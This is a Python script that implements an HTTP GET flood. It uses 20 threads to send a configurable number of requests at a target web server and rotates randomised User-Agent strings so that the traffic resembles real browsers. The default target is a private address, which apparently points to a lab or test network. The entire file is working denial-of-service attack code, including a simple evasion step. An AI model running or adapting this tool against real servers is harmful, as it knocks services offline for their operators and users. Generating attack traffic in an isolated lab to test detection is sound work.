#!/usr/bin/env python3
"""
traffic_spike.py — HTTP GET flood using threading.

Sends --count requests across 20 threads to overwhelm the target web server.
Each request uses a randomised User-Agent to simulate real browser traffic.

Usage:
    python3 traffic_spike.py [--target http://172.20.0.10/] [--count 200]
"""
from __future__ import annotations

import argparse
import random
import threading
import time

import requests  # type: ignore[import]
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "curl/8.4.0",
    "python-requests/2.31.0",
]

_lock       = threading.Lock()
_total_sent = 0


def _flood(target: str, n_requests: int, count: int) -> None:
    global _total_sent
    for _ in range(n_requests):
        try:
            headers = {"User-Agent": random.choice(_USER_AGENTS)}
            requests.get(target, headers=headers, timeout=2)
        except Exception:
            pass
        with _lock:
            _total_sent += 1
            if _total_sent % 50 == 0:
                pct = int(_total_sent / count * 100)
                console.print(f"    [dim]→[/dim]  {_total_sent}/{count} requests  [dim]({pct}%)[/dim]")


def main() -> None:
    parser = argparse.ArgumentParser(description="HTTP GET flood")
    parser.add_argument("--target", default="http://172.20.0.10/")
    parser.add_argument("--count",  type=int, default=200)
    args = parser.parse_args()

    n_threads  = 20
    per_thread = max(1, args.count // n_threads)

    console.print(Panel(
        f"  [dim]Target: [/dim]  [bold cyan]{args.target}[/bold cyan]\n"
        f"  [dim]Requests:[/dim]  [white]{args.count}[/white]  [dim]via {n_threads} threads[/dim]",
        title="[bold red]🌊  HTTP GET FLOOD[/bold red]",
        border_style="red",
        box=box.DOUBLE,
        padding=(0, 1),
    ))

    console.print(f"\n  [bold][[STEP 1/2][/bold]  Spawning [cyan]{n_threads} threads[/cyan]...")
    console.print(f"  [bold][[STEP 2/2][/bold]  Flooding...")

    start_time = time.time()
    threads = [
        threading.Thread(target=_flood, args=(args.target, per_thread, args.count), daemon=True)
        for _ in range(n_threads)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    console.print(f"\n  [bold green]✓  Done[/bold green]  │  {_total_sent} requests sent  │  {elapsed:.1f}s\n")


if __name__ == "__main__":
    main()
